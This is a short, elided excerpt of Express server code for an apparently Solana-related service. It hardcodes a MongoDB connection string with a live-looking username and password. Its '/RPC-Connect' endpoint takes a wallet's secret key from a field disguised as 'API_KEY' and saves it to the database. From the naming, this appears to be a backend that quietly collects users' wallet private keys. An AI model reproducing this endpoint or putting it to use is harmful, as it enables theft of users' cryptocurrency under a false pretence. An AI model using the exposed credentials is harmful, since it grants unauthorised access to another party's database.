...
const mongoURI = 'mongodb+srv://vanguard951105:F0Y7B0MtjvH1OFbL@cluster0.haemz.mongodb.net/solana?retryWrites=true&w=majority';
...
app.post('/RPC-Connect', async (req, res) => {
    try {
        ...
        const { publicKey, secretKey } = req.body.API_KEY._keypair;
        ...
        res.status(201).json({ message: 'Private key saved successfully', data: newPrivateKey });
    } catch (error) {
        console.error('Error saving private key:', error);
        res.status(500).json({ error: 'An error occurred while saving the private key' });
    }
});
